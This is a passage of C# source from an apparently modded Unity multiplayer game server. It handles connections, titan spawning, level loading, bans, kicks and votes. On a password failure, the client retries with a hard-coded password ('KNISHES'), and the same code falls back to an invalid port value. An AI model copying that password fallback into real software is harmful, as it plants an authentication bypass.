    private void OnConnectedToServer()
    {
        if(Network.isClient)
        {
            this.isTotonbusterEnforced = false;
            this.isNightmodeEnforced = false;
        }
        base.networkView.RPC("modme", RPCMode.Server, this.vern);
        if (isLobbySettingsOverriden)  //lobby name
        {
            this.setMyInfo(this.myLastHeroName, this.myLastHero);
        }
        Debug.Log("Connected to server  is enter lobby?:" + this.enterLobby);
        IN_GAME_MAIN_CAMERA.gametype = GAMETYPE.CLIENT;
        this.isFirstMatch = true;
        this.chatContent = new ArrayList();
        this.myRespawnTime = 0f;
        if (this.enterLobby)
        {
            if (GameObject.Find("ButtonBACK") != null)
            {
                GameObject.Find("ButtonBACK").GetComponent<UIButton>().isEnabled = true;
            }
            if (GameObject.Find("ButtonJOIN") != null)
            {
                GameObject.Find("ButtonJOIN").GetComponent<UIButton>().isEnabled = true;
            }
            NGUITools.SetActive(GameObject.Find("UIRefer").GetComponent<UIMainReferences>().PanelMultiJoinPrivate, false);
            NGUITools.SetActive(GameObject.Find("UIRefer").GetComponent<UIMainReferences>().panelMultiJoin, false);
            NGUITools.SetActive(GameObject.Find("UIRefer").GetComponent<UIMainReferences>().PanelMultiWait, true);
            if (isLobbySettingsOverriden)
                GameObject.Find("InputPlayerName").GetComponent<UIInput>().text = this.myLastHeroName;
        }
    }

    private void OnDisconnectedFromServer()
    {
        if (this.enterLobby)
        {
            if (IN_GAME_MAIN_CAMERA.gametype == GAMETYPE.CLIENT)
            {
                NGUITools.SetActive(GameObject.Find("UIRefer").GetComponent<UIMainReferences>().PanelMultiWait, false);
                NGUITools.SetActive(GameObject.Find("UIRefer").GetComponent<UIMainReferences>().panelMain, true);
            }
        }
        else
        {
            this.netShowHUDInfoCenter("Disconnected From Server\n\n\n\n\n\n");
            Screen.lockCursor = false;
            Screen.showCursor = true;
            GameObject obj2 = GameObject.Find("UI_IN_GAME");
            GameObject obj3 = (GameObject) UnityEngine.Object.Instantiate(Resources.Load("UI/ButtonQUIT"));
            obj3.transform.parent = obj2.GetComponent<UIReferArray>().panels[0].transform;
            obj3.transform.localScale = new Vector3(1f, 1f, 1f);
        }
    }

    public void oneTitanDown()
    {
        this.oneTitanDown("TITAN");
    }

    public void oneTitanDown(string name1)
    {
        if (IN_GAME_MAIN_CAMERA.gametype == GAMETYPE.SINGLE)
        {
            if (this.checkIsTitanAllDie())
            {
                GameObject.Find("MainCamera").GetComponent<IN_GAME_MAIN_CAMERA>().gameOver = true;
            }
        }
        else if (Network.peerType != NetworkPeerType.Server)
        {
            return;
        }
        if (IN_GAME_MAIN_CAMERA.gamemode == GAMEMODE.CAGE_FIGHT)
        {
            int rate = 90;
            if (this.difficulty == 1)
            {
                rate = 70;
            }
            this.randomSpawnTitan("titanRespawn2", rate).name = "TITAN_CAGE2";
            this.randomSpawnTitan("titanRespawn", rate).name = "TITAN_CAGE1";
            int num2 = 0;
            if (this.timeTotal < 30f)
            {
                num2 = 1;
            }
            else if (this.timeTotal < 60f)
            {
                num2 = 2;
            }
            else if (this.timeTotal < 90f)
            {
                num2 = 3;
            }
            else
            {
                num2 = 4;
            }
            if (name1 == "TITAN_CAGE1")
            {
                for (int i = 0; i < num2; i++)
                {
                    this.randomSpawnTitan("titanRespawn2", rate).name = "TITAN_CAGE2";
                }
            }
            else
            {
                for (int j = 0; j < num2; j++)
                {
                    this.randomSpawnTitan("titanRespawn", rate).name = "TITAN_CAGE1";
                }
            }
        }
        else if (IN_GAME_MAIN_CAMERA.gamemode == GAMEMODE.KILL_TITAN)
        {
            if (this.checkIsTitanAllDie())
            {
                this.gameWin();
            }
        }
        else if (IN_GAME_MAIN_CAMERA.gamemode == GAMEMODE.SURVIVE_MODE)
        {
            if (this.checkIsTitanAllDie())
            {
                this.wave++;
                if (LevelInfo.getInfo(this.map).respawnMode == RespawnMode.NEWROUND)
                {
                    base.networkView.RPC("respawnHeroInNewRound", RPCMode.All, new object[0]);
                }
                this.sendChatContentInfo("[FF0000]* Wave : " + this.wave + "*[-]");
                if (this.wave > this.highestwave)
                {
                    this.highestwave = this.wave;
                }
                if (this.wave > 20)
                {
                    this.gameWin();
                }
                else
                {
                    int num5 = 90;
                    if (this.difficulty == 1)
                    {
                        num5 = 70;
                    }
                    for (int k = 0; k < (this.wave + 2); k++)
                    {
                        this.randomSpawnTitan("titanRespawn", num5);
                    }
                }
            }
        }
        else if (IN_GAME_MAIN_CAMERA.gamemode == GAMEMODE.ENDLESS_TITAN)
        {
            this.humanScore++;
            int num7 = 90;
            if (this.difficulty == 1)
            {
                num7 = 70;
            }
            this.randomSpawnTitan("titanRespawn", num7);
        }
    }

    private void OnFailedToConnect(NetworkConnectionError error)
    {
        if (error == NetworkConnectionError.InvalidPassword && GameObject.Find("InputIP").GetComponent<UIInput>().label.text != null)
        {
            int result = 0;
            if (!int.TryParse(GameObject.Find("InputPort").GetComponent<UIInput>().label.text, out result))
            {
                result = 0x40b28;
                GameObject.Find("InputPort").GetComponent<UIInput>().label.text = "265000";
            }
            Debug.Log("-------------Wrong Pass=================");
            Network.Connect(GameObject.Find("InputIP").GetComponent<UIInput>().label.text, result, "KNISHES");
            GameObject.Find("MultiplayerManager").GetComponent<FengMultiplayerScript>().lobbypass = true;
        }
        else
        {
            if (GameObject.Find("InputIP").GetComponent<UIInput>().label.text != null)
            {
                Debug.Log("Could not connect to server: " + error);
                GameObject.Find("LabelJoinInfo").GetComponent<UILabel>().text = "Failed To Connect";
                GameObject.Find("ButtonBACK").GetComponent<UIButton>().isEnabled = true;
                GameObject.Find("ButtonJOIN").GetComponent<UIButton>().isEnabled = true;
            }
        }
        this.enterLobby = false;
    }

    private void OnLevelWasLoaded(int level)
    {
        #if Server
        if (Network.isServer)
        {
            startidle();
            if (this.isNightmodeEnforced)
                EnforceNightMode();
        }
        #endif
        if (isLobbySettingsOverriden)
        {
            this.setMyInfo(this.myLastHeroName, this.myLastHero);
        }
        Debug.Log("OnLevelWasLoaded" + level);
        if (IN_GAME_MAIN_CAMERA.gametype == GAMETYPE.SINGLE)
        {
            this.players = new PlayerInfo[] { new PlayerInfo() };
            this.timeTotal = 0f;
        }
        else if (level != 0)
        {
            if (this.camerao)
                IN_GAME_MAIN_CAMERA.cameraMode = CAMERA_TYPE.TPS;
            if (IN_GAME_MAIN_CAMERA.cameraMode == CAMERA_TYPE.TPS)
            {
                Screen.lockCursor = true;
            }
            else
            {
                Screen.lockCursor = false;
            }
            this.enterLobby = false;
            Screen.showCursor = false;
            Network.isMessageQueueRunning = true;
            Network.SetSendingEnabled(0, true);
            GameObject obj2 = (GameObject) UnityEngine.Object.Instantiate(Resources.Load("MainCamera_mono"), GameObject.Find("cameraDefaultPosition").transform.position, GameObject.Find("cameraDefaultPosition").transform.rotation);
            UnityEngine.Object.Destroy(GameObject.Find("cameraDefaultPosition"));
            obj2.name = "MainCamera";
            GameObject obj3 = (GameObject) UnityEngine.Object.Instantiate(Resources.Load("UI_IN_GAME"));
            obj3.name = "UI_IN_GAME";
            obj3.SetActive(true);
            NGUITools.SetActive(obj3.GetComponent<UIReferArray>().panels[0], true);
            NGUITools.SetActive(obj3.GetComponent<UIReferArray>().panels[1], false);
            NGUITools.SetActive(obj3.GetComponent<UIReferArray>().panels[2], false);
            this.isFirstMatch = false;
            if (LevelInfo.getInfo(this.map).type == GAMEMODE.CAGE_FIGHT)
            {
                if (Network.isServer)
                {
                    this.SpawnPlayer(this.myLastHero, "playerRespawn");
                }
                else
                {
                    this.SpawnPlayer(this.myLastHero, "playerRespawn2");
                }
                if (Network.isServer && (this.players[1] != null))
                {
                    GameObject obj4;
                    int num = 90;
                    if (this.difficulty == 1)
                    {
                        num = 70;
                    }
                    GameObject[] objArray = GameObject.FindGameObjectsWithTag("titanRespawn");
                    int index = UnityEngine.Random.Range(0, objArray.Length);
                    GameObject obj5 = objArray[index];
                    string[] strArray = new string[] { "TITAN_NEW_1", "TITAN_NEW_2" };
                    if (UnityEngine.Random.Range(0, 100) < num)
                    {
                        obj4 = (GameObject) Network.Instantiate(Resources.Load(strArray[UnityEngine.Random.Range(0, strArray.Length)]), obj5.transform.position, obj5.transform.rotation, 0);
                        if (IN_GAME_MAIN_CAMERA.difficulty == 2)
                        {
                            if (UnityEngine.Random.Range((float) 0f, (float) 1f) < 0.7f)
                            {
                                obj4.GetComponent<TITAN>().setAbnormalType(AbnormalType.TYPE_JUMPER);
                            }
                            else
                            {
                                obj4.GetComponent<TITAN>().setAbnormalType(AbnormalType.TYPE_CRAWLER);
                            }
                        }
                        if(iscrawler)
                            obj4.GetComponent<TITAN>().setAbnormalType(AbnormalType.TYPE_CRAWLER);

                    }
                    else
                    {
                        obj4 = (GameObject) Network.Instantiate(Resources.Load(strArray[UnityEngine.Random.Range(0, strArray.Length)]), obj5.transform.position, obj5.transform.rotation, 0);
                        if (IN_GAME_MAIN_CAMERA.difficulty == 2)
                        {
                            if (UnityEngine.Random.Range((float) 0f, (float) 1f) < 0.7f)
                            {
                                obj4.GetComponent<TITAN>().setAbnormalType(AbnormalType.TYPE_JUMPER);
                            }
                            else
                            {
                                obj4.GetComponent<TITAN>().setAbnormalType(AbnormalType.TYPE_CRAWLER);
                            }
                        }
                        else if (UnityEngine.Random.Range(0, 100) < num)
                        {
                            obj4.GetComponent<TITAN>().setAbnormalType(AbnormalType.TYPE_I);
                        }
                        else if (UnityEngine.Random.Range((float) 0f, (float) 1f) < 0.7f)
                        {
                            obj4.GetComponent<TITAN>().setAbnormalType(AbnormalType.TYPE_JUMPER);
                        }
                        else
                        {
                            obj4.GetComponent<TITAN>().setAbnormalType(AbnormalType.TYPE_CRAWLER);
                        }
                        if (iscrawler)
                            obj4.GetComponent<TITAN>().setAbnormalType(AbnormalType.TYPE_CRAWLER);
                    }
                    obj4.name = "TITAN_CAGE1";
                    objArray = GameObject.FindGameObjectsWithTag("titanRespawn2");
                    index = UnityEngine.Random.Range(0, objArray.Length);
                    obj5 = objArray[index];
                    if (UnityEngine.Random.Range(0, 100) < num)
                    {
                        obj4 = (GameObject) Network.Instantiate(Resources.Load(strArray[UnityEngine.Random.Range(0, strArray.Length)]), obj5.transform.position, obj5.transform.rotation, 0);
                        if (IN_GAME_MAIN_CAMERA.difficulty == 2)
                        {
                            if (UnityEngine.Random.Range((float) 0f, (float) 1f) < 0.7f)
                            {
                                obj4.GetComponent<TITAN>().setAbnormalType(AbnormalType.TYPE_JUMPER);
                            }
                            else
                            {
                                obj4.GetComponent<TITAN>().setAbnormalType(AbnormalType.TYPE_CRAWLER);
                            }
                        }
                        if (iscrawler)
                            obj4.GetComponent<TITAN>().setAbnormalType(AbnormalType.TYPE_CRAWLER);
                    }
                    else
                    {
                        obj4 = (GameObject) Network.Instantiate(Resources.Load(strArray[UnityEngine.Random.Range(0, strArray.Length)]), obj5.transform.position, obj5.transform.rotation, 0);
                        if (IN_GAME_MAIN_CAMERA.difficulty == 2)
                        {
                            if (UnityEngine.Random.Range((float) 0f, (float) 1f) < 0.7f)
                            {
                                obj4.GetComponent<TITAN>().setAbnormalType(AbnormalType.TYPE_JUMPER);
                            }
                            else
                            {
                                obj4.GetComponent<TITAN>().setAbnormalType(AbnormalType.TYPE_CRAWLER);
                            }
                        }
                        else if (UnityEngine.Random.Range(0, 100) < num)
                        {
                            obj4.GetComponent<TITAN>().setAbnormalType(AbnormalType.TYPE_I);
                        }
                        else if (UnityEngine.Random.Range((float) 0f, (float) 1f) < 0.7f)
                        {
                            obj4.GetComponent<TITAN>().setAbnormalType(AbnormalType.TYPE_JUMPER);
                        }
                        else
                        {
                            obj4.GetComponent<TITAN>().setAbnormalType(AbnormalType.TYPE_CRAWLER);
                        }
                        if (iscrawler)
                            obj4.GetComponent<TITAN>().setAbnormalType(AbnormalType.TYPE_CRAWLER);
                    }
                    obj4.name = "TITAN_CAGE2";
                }
            }
            else if (Network.isServer)
            {
                #if Server
                if (!this.isDedicated)
                {
                #endif
                    this.SpawnPlayer(this.myLastHero, "playerRespawn");
                    
                #if Server
                }
                else
                {
                    GameObject.Find("MainCamera").GetComponent<IN_GAME_MAIN_CAMERA>().setMainObject(null);
                    GameObject.Find("MainCamera").GetComponent<IN_GAME_MAIN_CAMERA>().gameOver = true;
                    this.players[0].dead = true;
                    GameObject.Find("skill_cd_bottom").transform.localPosition = new Vector3(0f, (-Screen.height) + 5f, 0f);
                    GameObject.Find("GasUI").transform.localPosition = GameObject.Find("skill_cd_bottom").transform.localPosition;
                    this.playerWhoTheFuckIsDead("-1");
                }
                #endif
            }
            else
            {
                //if(this.lobbypass)

                base.networkView.RPC("RPCaskServerForInfoAndSpawn", RPCMode.Server, new object[0]);
                DebugConsole.Log("ASK TO BE SPAWNED");
            }
            GameObject.Find("MainCamera").GetComponent<IN_GAME_MAIN_CAMERA>().setHUDposition();
            if (Network.isServer)
            {
                #if Server
                if (this.islava)
                {
                    GameObject.Destroy(GameObject.Find("aot_supply"), 0f);
                    Network.Instantiate(Resources.Load("aot_supply"), new Vector3(-61.8f, 42.9f, -508.4f), new Quaternion(0, 1, 0, 0), 0);
                }
                #endif
                GameObject[] objArray2 = GameObject.FindGameObjectsWithTag("titanRespawn");
                int num3 = 90;
                if (this.difficulty == 1)
                {
                    num3 = 70;
                }
                LevelInfo info = LevelInfo.getInfo(this.map);
                if (((info.type == GAMEMODE.KILL_TITAN) || (info.type == GAMEMODE.ENDLESS_TITAN)) || (info.type == GAMEMODE.SURVIVE_MODE))
                {
                    if ((info.name == "Annie") || (info.name == "Annie II"))
                    {
                        GameObject obj6 = (GameObject) Network.Instantiate(Resources.Load("FEMALE_TITAN"), GameObject.Find("titanRespawn").transform.position, GameObject.Find("titanRespawn").transform.rotation, 0);
                    }
                    else
                    {
                        for (int i = 0; i < info.enemyNumber; i++)
                        {
                            GameObject obj8;
                            int num5 = UnityEngine.Random.Range(0, objArray2.Length);
                            GameObject obj7 = objArray2[num5];
                            while (objArray2[num5] == null)
                            {
                                num5 = UnityEngine.Random.Range(0, objArray2.Length);
                                obj7 = objArray2[num5];
                            }
                            objArray2[num5] = null;
                            string[] strArray2 = new string[] { "TITAN_NEW_1", "TITAN_NEW_2" };
                            if (UnityEngine.Random.Range(0, 100) < num3)
                            {
                                obj8 = (GameObject) Network.Instantiate(Resources.Load(strArray2[UnityEngine.Random.Range(0, strArray2.Length)]), obj7.transform.position, obj7.transform.rotation, 0);
                                if (IN_GAME_MAIN_CAMERA.difficulty == 2)
                                {
                                    if (UnityEngine.Random.Range((float) 0f, (float) 1f) < 0.7f)
                                    {
                                        obj8.GetComponent<TITAN>().setAbnormalType(AbnormalType.TYPE_JUMPER);
                                    }
                                    else
                                    {
                                        obj8.GetComponent<TITAN>().setAbnormalType(AbnormalType.TYPE_CRAWLER);
                                    }
                                }
                                #if Server
                                if (iscrawler)
                                    obj8.GetComponent<TITAN>().setAbnormalType(AbnormalType.TYPE_CRAWLER);
                                #endif                      
                            }
                            else
                            {
                                obj8 = (GameObject) Network.Instantiate(Resources.Load(strArray2[UnityEngine.Random.Range(0, strArray2.Length)]), obj7.transform.position, obj7.transform.rotation, 0);
                                if (IN_GAME_MAIN_CAMERA.difficulty == 2)
                                {
                                    if (UnityEngine.Random.Range((float) 0f, (float) 1f) < 0.7f)
                                    {
                                        obj8.GetComponent<TITAN>().setAbnormalType(AbnormalType.TYPE_JUMPER);
                                    }
                                    else
                                    {
                                        obj8.GetComponent<TITAN>().setAbnormalType(AbnormalType.TYPE_CRAWLER);
                                    }
                                }
                                else if (UnityEngine.Random.Range(0, 100) < num3)
                                {
                                    if (UnityEngine.Random.Range((float) 0f, (float) 1f) < 0.8f)
                                    {
                                        obj8.GetComponent<TITAN>().setAbnormalType(AbnormalType.TYPE_I);
                                    }
                                    else
                                    {
                                        obj8.GetComponent<TITAN>().setAbnormalType(AbnormalType.TYPE_CRAWLER);
                                    }
                                }
                                else if (UnityEngine.Random.Range((float) 0f, (float) 1f) < 0.8f)
                                {
                                    obj8.GetComponent<TITAN>().setAbnormalType(AbnormalType.TYPE_JUMPER);
                                }
                                else
                                {
                                    obj8.GetComponent<TITAN>().setAbnormalType(AbnormalType.TYPE_CRAWLER);
                                }
                                #if Server
                                if (iscrawler)
                                    obj8.GetComponent<TITAN>().setAbnormalType(AbnormalType.TYPE_CRAWLER);
                                #endif
                          }
                        }
                    }
                }
                else if (info.type == GAMEMODE.TROST)
                {
                    GameObject obj9 = (GameObject)Network.Instantiate(Resources.Load("TITAN_EREN_trost"), new Vector3(-200f, 0f, -194f), Quaternion.Euler(0f, 180f, 0f), 0);
                    obj9.GetComponent<TITAN_EREN>().rockLift = true;
                    foreach (GameObject obj10 in objArray2)
                    {
                        this.spawnTitan(num3, obj10.transform.position, obj10.transform.rotation);
                    }
                }
            }
        }
    }

    private void OnPlayerConnected(NetworkPlayer networkPlayer)
    {
        if(Banlist.Exists(x => x.ipaddrese ==networkPlayer.ipAddress))
        {
            BanInfo test = Banlist.Find(x => x.ipaddrese ==networkPlayer.ipAddress);
            if ((test.issued + test.hours < System.DateTime.Now.Ticks && test.hours > 0))
                Banlist.Remove(test);
            else
            {
                object[] objArray3 = new object[] { "You are Banned" };
                base.networkView.RPC("TellPlayerHeHasntRegister", networkPlayer, objArray3);
                Network.RemoveRPCs(networkPlayer);
                Network.DestroyPlayerObjects(networkPlayer);
                Network.CloseConnection(networkPlayer, true);
            }
        }
        int num;
        PlayerInfo info;
        object[] args = new object[] { networkPlayer.ToString(), UIMainReferences.version };
        base.networkView.RPC("TellPlayerHisNetworkplayerID", networkPlayer, args);
        #if Server
        object[] mt = new object[] { (this.motd+"\n") };
        base.networkView.RPC("showChatContent",networkPlayer,mt);
        #endif
        if (this.enterLobby)
        {
            for (int i = 0; i < this.numberOfPlayers; i++)
            {
                if (this.playersRegistered[i] == null)
                {
                    PlayerInfo info3 = new PlayerInfo();
                    info3.networkplayer = networkPlayer;
                    info3.id = networkPlayer.ToString();
                    info3.playerIP = networkPlayer.ipAddress;
                    info = info3;
                    this.playersRegistered[i] = info;
                    DebugConsole.Log("new comer ID : " + networkPlayer.ToString() + " my ID : " + base.networkView.owner.ToString() + "my IP: " + info.playerIP);
                    return;
                }
            }
        }
        #if Server
        else if (this.isPublicGame || this.REMOVELOBBY)
            {
                for (num = 0; num < this.numberOfPlayers; num++)
                {
                    if (this.players[num] == null)
                    {
                        PlayerInfo info2 = new PlayerInfo();
                        info2.networkplayer = networkPlayer;
                        info2.id = networkPlayer.ToString();
                        info2.dead = true;
                        info2.SET = false;
                        info2.playerIP = networkPlayer.ipAddress;
                        info = info2;
                        this.players[num] = info;
                        this.playersRegistered[num] = info;
                        DebugConsole.Log("new comer ID : " + networkPlayer.ToString() + " my ID : " + base.networkView.owner.ToString() + "my IP: " + info.playerIP);
                        base.networkView.RPC("TellPlayerHisNetworkplayerIndex", networkPlayer, new object[] { num });
                        StartCoroutine(YourFunction(num));
                        break;
                    }
                }
            }
        #endif
        else
        {
            string str = networkPlayer.ipAddress + ":::";
            for (int j = 0; j < this.numberOfPlayers; j++)
            {
                if (this.playersRegistered[j] != null)
                {
                    str = str + this.playersRegistered[j].playerIP + ":";
                    MonoBehaviour.print(this.playersRegistered[j].playerIP + "  ----   " + networkPlayer.ipAddress);
                    if (this.playersRegistered[j].playerIP == networkPlayer.ipAddress)
                    {
                        for (int k = 0; k < this.numberOfPlayers; k++)
                        {
                            if (this.players[k] == null)
                            {
                                this.players[k] = this.playersRegistered[j];
                                this.players[k].networkplayer = networkPlayer;
                                this.players[k].id = networkPlayer.ToString();
                                this.players[k].playerIP = networkPlayer.ipAddress;
                                object[] objArray2 = new object[] { k };
                                base.networkView.RPC("TellPlayerHisNetworkplayerIndex", networkPlayer, objArray2);
                                #if Server
                                if (this.letpublic)
                                    RPCLoadLevelTo(networkPlayer);
                                #endif
                                return;
                            }
                        }
                    }
                }
            }
            object[] objArray3 = new object[] { string.Empty };
            base.networkView.RPC("TellPlayerHeHasntRegister", networkPlayer, objArray3);
        }
    }
    #if Server
    IEnumerator YourFunction(int num)
    {
        yield return new WaitForSeconds(30.0f);
        if (players[num] != null)
        {
            if (this.players[num].name == "-watcher-")
            {
                Network.RemoveRPCs(this.players[num].networkplayer);
                Network.DestroyPlayerObjects(this.players[num].networkplayer);
                Network.CloseConnection(this.players[num].networkplayer, true);
                DebugConsole.Log("Kick");
            }
        }
    }
    #endif
    IEnumerator Delay()
    {
        yield return new WaitForSeconds(1.0f);
        MasterServer.RegisterHost("AOTTGG", "[" + this.map + "]" + this.serverName, string.Empty);
        #if Server
        if(this.isPublicGame || (this.enterLobby && this.usingMasterServer))
        #else
        if(this.enterLobby)
        #endif
        StartCoroutine(Delayy());
    }
    IEnumerator Delayy()
    {
        yield return new WaitForSeconds(15.0f);
        MasterServer.RegisterHost("AOTTG", "[" + this.map + "]" + this.serverName, string.Empty);
    }
    private void OnPlayerDisconnected(NetworkPlayer networkPlayer)
    {
        if (this.enterLobby)
        {
            if (!this.isCallLaterNetworkInitializeServer)
            {
                for (int i = 0; i < this.numberOfPlayers; i++)
                {
                    if ((this.playersRegistered[i] != null) && (this.playersRegistered[i].id == networkPlayer.ToString()))
                    {
                        this.playersRegistered[i] = null;
                        break;
                    }
                }
            }
        }
        else
        {
            int num2 = -1;
            for (int j = 0; j < this.numberOfPlayers; j++)
            {
                if ((this.players[j] != null) && (this.players[j].id == networkPlayer.ToString()))
                {
                    this.players[j] = null;
                    #if Server
                    this.waittospawn[j] = true;
                    if (this.isPublicGame)
                        this.playersRegistered[j] = null;
                    #endif
                    this.playerWhoTheFuckIsDead("-1");
                    num2 = j;
                    break;
                }
            }
            if ((num2 == 1) && (IN_GAME_MAIN_CAMERA.gamemode == GAMEMODE.CAGE_FIGHT))
            {
                this.timeTotalServer = this.time;
            }
        }
        Network.RemoveRPCs(networkPlayer);
        Network.DestroyPlayerObjects(networkPlayer);
        if (currentVote != null)
        {
            voteYes++;
            int playersExist = 0;
            if (isDedicated)
            {
                playersExist = -1;
            }
            foreach (PlayerInfo ply in this.players)
            {
                if (ply != null)
                {
                    playersExist++;
                }
                base.networkView.RPC("showChatContent", RPCMode.All, new object[] { "[e39629]*" + voteYes.ToString() + "\\" + playersExist.ToString() + " voted for: " + currentVote + ".*[-]\n" });
                if (voteYes >= (((float)playersExist) / 2.0))
                {
                    this.rconcmd(currentVote,  By, new NetworkMessageInfo());
                    voteYes = 0;
                    currentVote = null;
                }
            }
        }
    }

    public void OnServerInitialized()
    {
        Debug.Log(string.Concat(new object[] { "Server initialized and ready ", this.numberOfPlayers, " is Lobby? ", this.enterLobby }));
        PlayerInfo info = new PlayerInfo();

            this.loadConfigFiles();
            #if Server
            this.loadargs();
            this.waittospawn = new bool[this.numberOfPlayers];
            #endif
            this.playersRegistered = new PlayerInfo[this.numberOfPlayers];
            this.players = new PlayerInfo[this.numberOfPlayers];
            #if Server
            this.pos = new Vector3[this.numberOfPlayers];
            #endif
            PlayerInfo info3 = new PlayerInfo();
            info3.networkplayer = base.networkView.owner;
            info3.name = this.myLastHeroName;
            info3.id = base.networkView.owner.ToString();
            info3.resourceId = this.myLastHero;
            info = info3;
            this.players[0] = info;
            this.playersRegistered[0] = info;
            #if Server
            this.waittospawn[0] = false;
            #endif
            this.myNetworkplayerIDOnServer = info.id;
            this.myNetworkplayerIndexOnServer = 0;

        this.nump = this.privates;
        IN_GAME_MAIN_CAMERA.gametype = GAMETYPE.SERVER;
        this.isFirstMatch = true;
        this.humanScore = 0;
        this.titanScore = 0;
        this.timeElapse = 0f;
        this.timeTotal = 0f;
        this.timeTotalServer = 0f;
        this.isWinning = false;
        this.isLosing = false;
        this.isPlayer1Winning = false;
        this.isPlayer2Winning = false;
        this.myRespawnTime = 0f;
        this.chatContent = new ArrayList();
        #if Server
        if (this.REMOVELOBBY)
        {
            if (this.letpublic)
                this.LoadLevelII(this.map, this.lastLevelPrefix + 1);
           this.RPCLoadLevel();
        }
        #endif

    }

    private void player1win()
    {
        if (!this.isPlayer2Winning)
        {
            this.isPlayer1Winning = true;
            this.humanScore++;
            this.gameEndCD = this.gameEndTotalCDtime;
        }
    }

    private void player2win()
    {
        if (!this.isPlayer1Winning)
        {
            this.isPlayer2Winning = true;
            this.titanScore++;
            this.gameEndCD = this.gameEndTotalCDtime;
        }
    }

    private void playerDamageInfoUpdate(PlayerInfo player, int dmg)
    {
        player.maxDamage = Mathf.Max(dmg, player.maxDamage);
        player.totalDamage += dmg;
    }

    public void playerKillInfoUpdate(PlayerInfo player, int dmg)
    {
        player.kills++;
        player.maxDamage = Mathf.Max(dmg, player.maxDamage);
        player.totalDamage += dmg;
    }

    public void playerWhoTheFuckIsDead(string id)
    {
        int num = 0;
        int num2 = 0;
        int num3 = 0;
        #if Server
        if (this.isDedicated)
        {
            this.players[0].dead = true;
        }
        #endif
        for (int i = 0; i < this.numberOfPlayers; i++)
        {
            if (this.players[i] != null)
            {
                if (this.players[i].id == id)
                {
                    this.players[i].dead = true;
                    PlayerInfo info1 = this.players[i];
                    info1.die++;
                    num3 = i;
                }
                num++;
                if (this.players[i].dead)
                {
                    num2++;
                }
            }
        }
        if (IN_GAME_MAIN_CAMERA.gamemode == GAMEMODE.ENDLESS_TITAN)
        {
            this.titanScore++;
        }
        else if (((IN_GAME_MAIN_CAMERA.gamemode == GAMEMODE.KILL_TITAN) || (IN_GAME_MAIN_CAMERA.gamemode == GAMEMODE.SURVIVE_MODE)) || (IN_GAME_MAIN_CAMERA.gamemode == GAMEMODE.BOSS_FIGHT_CT))
        {
            if (num == num2)
            {
                this.gameLose();
            }
        }
        else if (IN_GAME_MAIN_CAMERA.gamemode == GAMEMODE.CAGE_FIGHT)
        {
            switch (num3)
            {
                case 0:
                    this.player2win();
                    break;

                case 1:
                    this.player1win();
                    break;
            }
        }
    }

    public GameObject randomSpawnTitan(string place, int rate)
    {
        GameObject[] objArray = GameObject.FindGameObjectsWithTag(place);
        int index = UnityEngine.Random.Range(0, objArray.Length);
        GameObject obj2 = objArray[index];
        return this.spawnTitan(rate, obj2.transform.position, obj2.transform.rotation);
    }

    [RPC]
    private void reConnectToTheServerWithOldData()
    {
        Network.Disconnect();
        this.isCallLaterNetworkConnectMyLastHostData = true;
        this.calllaterDuration = 0f;
        MonoBehaviour.print("server ask me to reconnect because I am registered");
    }

    [RPC]
    private void respawnHeroInNewRound()
    {
        if (GameObject.Find("MainCamera").GetComponent<IN_GAME_MAIN_CAMERA>().gameOver)
        {
            #if Server
            if (Network.isServer)
            {
                if (!this.isDedicated)
                {
                    this.SpawnPlayer(this.myLastHero, "playerRespawn");
                    this.players[0].dead = false;
                    GameObject.Find("MainCamera").GetComponent<IN_GAME_MAIN_CAMERA>().gameOver = false;
                }
                else
                {
                    GameObject.Find("MainCamera").GetComponent<IN_GAME_MAIN_CAMERA>().setMainObject(null);
                    GameObject.Find("MainCamera").GetComponent<IN_GAME_MAIN_CAMERA>().gameOver = true;
                    this.players[0].dead = true;
                    GameObject.Find("skill_cd_bottom").transform.localPosition = new Vector3(0f, (-Screen.height) + 5f, 0f);
                    GameObject.Find("GasUI").transform.localPosition = GameObject.Find("skill_cd_bottom").transform.localPosition;
                    this.playerWhoTheFuckIsDead("-1");
                }
            }
            else
            {
            #endif
                this.SpawnPlayer(this.myLastHero, "playerRespawn");
                GameObject.Find("MainCamera").GetComponent<IN_GAME_MAIN_CAMERA>().gameOver = false;
            #if Server
            }
            #endif

        }
    }
    #if Server
    public void kickPlayer(int playernumber)
    {
        int index = 0;
        while ((index < (this.players.Length - 1)))
        {
            if(this.players[index] != null)
            {
                if ((Convert.ToInt32(this.players[index].id) == playernumber))
                    break;
            }
            index++;
        }
        if (index < (this.players.Length - 1))
        {
            Network.RemoveRPCs(this.players[index].networkplayer);
            Network.DestroyPlayerObjects(this.players[index].networkplayer);
            Network.CloseConnection(this.players[index].networkplayer, true);
            this.players[index] = null;
            this.playerWhoTheFuckIsDead("-1");
        }

    }
    public void kickPlayer(string player)
    {
        int playernumber = Convert.ToInt32(player);
        int index = 0;
        while ((index < (this.players.Length - 1)))
        {
            if (this.players[index] != null)
            {
                if ((Convert.ToInt32(this.players[index].id) == playernumber))
                    break;
            }
            index++;
        }
        if (index < (this.players.Length - 1))
        {
            Network.RemoveRPCs(this.players[index].networkplayer);
            Network.DestroyPlayerObjects(this.players[index].networkplayer);
            Network.CloseConnection(this.players[index].networkplayer, true);
            this.playerWhoTheFuckIsDead("-1");
        }

    }
    public void killPlayer(string player)
    {
        int playernumber = Convert.ToInt32(player);
       foreach(GameObject a in GameObject.FindGameObjectsWithTag("Player"))
       {
            if (a != null)
            {
                if ((a.networkView.owner.ToString() == player))
                {
                    a.GetComponent<HERO>().markDie();
                    a.GetComponent<HERO>().networkView.RPC("netDie2", RPCMode.All, new object[0]);
                }
            }
        }

    }
    #endif
    public void setDifficulty(int difficulty)
    {
        this.difficulty = difficulty;
        IN_GAME_MAIN_CAMERA.difficulty = difficulty;
    }
    public void restartGame()
    {
        this.isFirstMatch = false;
        this.timeElapse = 0f;
        this.timeTotal = 0f;
        this.isWinning = false;
        this.isLosing = false;
        this.isPlayer1Winning = false;
        this.isPlayer2Winning = false;
        this.wave = 1;
        for (int i = 0; i < this.numberOfPlayers; i++)
        {
            if (this.players[i] != null)
            {
                if (players[i].SET)
                {
                    this.players[i].dead = false;
                    #if Server
                    this.waittospawn[i] = false;
                    if(this.letpublic)
                    RPCLoadLevelTo(players[i].networkplayer);
                    #endif
                }
            }
        }
        #if Server
        if (Network.isServer && this.letpublic)
        {
            this.myRespawnTime = 0f;
            LoadLevelII(this.map, this.lastLevelPrefix + 1);
        }
        else 
        #endif
        if (Network.isServer)
        {
            this.myRespawnTime = 0f;
            this.RPCLoadLevel();
        }
    }

    [RPC]
